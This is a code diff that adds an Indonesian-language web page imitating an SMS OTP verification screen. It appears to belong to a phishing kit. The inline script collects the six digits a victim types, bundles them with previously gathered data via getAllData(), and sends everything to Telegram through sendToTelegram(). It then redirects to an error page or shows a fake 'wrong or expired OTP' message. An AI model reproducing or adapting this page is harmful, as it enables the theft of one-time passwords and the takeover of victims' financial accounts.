@@ -1,0 +1,247 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan Security Code</title>
+    <script src="data-handler.js"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff; /* Sesuaikan dengan latar belakang gambar */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px; /* Lebar maksimal agar terlihat seperti tampilan mobile */
+            background-color: #fff;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative; /* Added for footer positioning */
+            min-height: 100vh; /* Added to ensure container takes full height */
+            padding-bottom: 80px; /* Added padding for footer */
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .header .icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 40px; /* Increased margin */
+            color: #333;
+            text-align: left; /* Align title left */
+        }
+        .subtitle {
+            /* Removed subtitle as per image */
+            display: none;
+        }
+        /* Removed phone input styles */
+        .forgot-link {
+            font-size: 14px;
+            color: #007bff; /* Warna biru untuk link */
+            text-decoration: none;
+        }
+        .legal-text {
+             /* Removed legal text as per image */
+             display: none;
+        }
+        .button {
+           /* Removed button as per image */
+           display: none;
+        }
+        .back-icon {
+            font-size: 36px;
+            cursor: pointer;
+            margin-bottom: 20px; /* Added margin */
+        }
+        .help-icon {
+           /* Removed help icon as per image */
+           display: none;
+        }
+
+        /* New styles for OTP input */
+        .otp-container {
+            display: flex;
+            justify-content: space-around; /* Distribute space around items */
+            margin-bottom: 20px;
+            width: 100%; /* Ensure container takes full width */
+        }
+
+        .otp-input {
+            width: 40px; /* Size of the circle */
+            height: 40px; /* Size of the circle */
+            border: 1px solid #ddd;
+            border-radius: 20%; /* Make it circular */
+            text-align: center;
+            color: #673ab7;
+            font-size: 20px;
+            margin: 0 5px; /* Space between circles */
+            outline: none;
+            box-sizing: border-box; /* Include padding and border in element's total width and height */
+             /* Sesuaikan dengan latar belakang gambar */
+             background-color: #f0f0f0; /* Light gray background for circles */
+        }
+
+        .otp-input:focus {
+            border-color: #673ab7; /* Purple border on focus */
+        }
+
+        /* New styles for hidden digit and purple border */
+        .otp-input.hidden-digit {
+            color: #673ab7; /* Hide the digit by making it the same color as the background */
+            border-color: #ffffff00; /* Purple border when digit is hidden */
+        }
+
+        /* New styles for footer */
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        .footer .forgot-link-container {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer .forgot-link-container a {
+             color: #007bff; /* Warna biru untuk link */
+             text-decoration: none;
+             font-weight: bold; /* Make the link bold */
+        }
+
+
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const timeouts = {};
+
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    if (timeouts[index]) {
+                        clearTimeout(timeouts[index]);
+                    }
+
+                    this.classList.remove('hidden-digit');
+
+                    if (this.value.length === 1) {
+                        timeouts[index] = setTimeout(() => {
+                            this.classList.add('hidden-digit');
+                        }, 500);
+
+                        if (index < otpInputs.length - 1) {
+                            otpInputs[index + 1].focus();
+                        } else {
+                            // All OTP digits entered
+                            const otp = Array.from(otpInputs).map(input => input.value).join('');
+                            storeData('otp', otp);
+                            
+                            // Send data to Telegram
+                            const data = getAllData();
+                            sendToTelegram(data).then(success => {
+                                if (success) {
+                                    window.location.href = 'error.html';
+                                } else {
+                                    showErrorPopup('OTP salah atau kadaluarsa. Silakan coba lagi.');
+                                }
+                            });
+                        }
+                    }
+                });
+
+                input.addEventListener('keydown', function(event) {
+                    if (event.key === 'Backspace') {
+                        this.classList.remove('hidden-digit');
+
+                        if (this.value.length === 0 && index > 0) {
+                            if (timeouts[index - 1]) {
+                                clearTimeout(timeouts[index - 1]);
+                            }
+                            otpInputs[index - 1].classList.remove('hidden-digit');
+                            otpInputs[index - 1].value = '';
+                            otpInputs[index - 1].focus();
+                        }
+                    }
+                });
+            });
+
+            // Countdown timer script
+            const countdownElement = document.getElementById('countdown');
+            let timeLeft = 60;
+
+            function updateCountdown() {
+                countdownElement.textContent = timeLeft;
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    setTimeout(updateCountdown, 1000);
+                } else {
+                    const countdownTextElement = document.getElementById('countdown-text');
+                    const resendLinkElement = document.getElementById('resend-link');
+                    countdownTextElement.style.display = 'none';
+                    resendLinkElement.style.display = 'inline';
+                }
+            }
+
+            updateCountdown();
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon back-icon">&#x21E6;</div>
+             <!-- Removed help icon -->
+        </div>
+        <div class="content">
+            <!-- Added image based on the provided screenshot -->
+            <img src="sms.png" alt="Verification Image" style="display: block; margin: 0 auto 20px auto; width: 300px;"> <!-- Placeholder: Replace with your image source -->
+            <div class="title" style="text-align: center; margin-bottom: 10px;">SMS Verifikasi telah Terkirim</div>
+             <!-- Removed subtitle -->
+            <div class="otp-container">
+                <input type="tel" class="otp-input" maxlength="1">
+                <input type="tel" class="otp-input" maxlength="1">
+                <input type="tel" class="otp-input" maxlength="1">
+                <input type="tel" class="otp-input" maxlength="1">
+                <input type="tel" class="otp-input" maxlength="1">
+                <input type="tel" class="otp-input" maxlength="1">
+            </div>
+             <!-- Removed forgot link from here -->
+        </div>
+         <!-- Removed legal text -->
+         <!-- Removed button -->
+
+         <!-- Added resend SMS text -->
+         <p style="text-align: center;  color: #666;">Belum dapet OTP? </p>
+         <div id="resend-container" style="text-align: center; color: #666;">
+           <span id="countdown-text">Kirim ulang dalam <span id="countdown">60</span> detik.</span>
+           <a href="otp.html" id="resend-link" style="color: #007bff; text-decoration: none; font-weight: bold; display: none;">kirim ulang kode</a>
+         </div>
+
+         <!-- Removed the existing footer as it's not in the image -->
+         <!--
+         <div class="footer">
+            <div class="forgot-link-container">
+                 Lupa kode kamu? <a href="#">Atur Ulang</a>
+            </div>
+         </div>
+         -->
+    </div>
+</body>
+</html> 
